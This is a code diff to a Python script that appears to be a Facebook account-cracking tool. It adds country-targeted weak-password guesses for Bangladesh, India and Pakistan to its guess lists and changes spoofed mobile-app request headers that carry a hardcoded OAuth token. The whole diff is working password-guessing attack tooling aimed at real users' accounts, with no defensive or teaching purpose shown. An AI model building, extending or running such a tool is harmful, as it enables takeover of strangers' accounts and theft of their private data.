@@ -482,6 +482,14 @@ def ___BD___():
         plist.append('last11')
         plist.append('@@@@####')
         plist.append('@#@#@#')
+        plist.append('freefire')
+        plist.append('iloveyou')
+        plist.append('786786')
+        plist.append('556677')
+        plist.append('135790')
+        plist.append('223344')
+        plist.append('102030')
+        plist.append('Bangladesh')
         
     elif __CH__ in ["B","b","2"]:
         ____banner____()
@@ -543,6 +551,21 @@ def ___INDIA___():
         plist.append('last7')
         plist.append('first8')
         plist.append('last8')
+        plist.append('first6')
+        plist.append('last6')
+        plist.append('first7')
+        plist.append('last7')
+        plist.append('first8')
+        plist.append('last8')
+        plist.append('last11')
+        plist.append('123123')
+        plist.append('pak786')
+        plist.append('786786')
+        plist.append('556677')
+        plist.append('135790')
+        plist.append('223344')
+        plist.append('102030')
+        plist.append('203040')
     elif __CH__ in ["B","b","2"]:
         psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}: \x1b[38;5;208m'));line()
         print(f"{red}[{white}k{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
@@ -657,12 +680,12 @@ def ___PK___():
         plist.append('first8')
         plist.append('last8')
         plist.append('last11')
-        plist.append('Mosabbir123')
-        plist.append('Mosabbir786')
-        plist.append('MosabbirMosabbir')
-        plist.append('Mosabbir Mosabbir')
-        plist.append('Mosabbir1234')
-        plist.append('Mosabbir12345')
+        plist.append('123123')
+        plist.append('pak786')
+        plist.append('786786')
+        plist.append('556677')
+        plist.append('135790')
+        plist.append('223344')
         plist.append('102030')
         plist.append('203040')
     elif __CH__ in ["B","b","2"]:
@@ -809,7 +832,7 @@ def randm(ids,psd,tl):
                 'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                 'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                 'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-Connection-Type':'MOBILE.LTE',
+                'X-FB-Connection-Type':'MOBILE.LTE.WiFi',
                 'X-Tigon-Is-Retry':'False',
                 'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                 'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
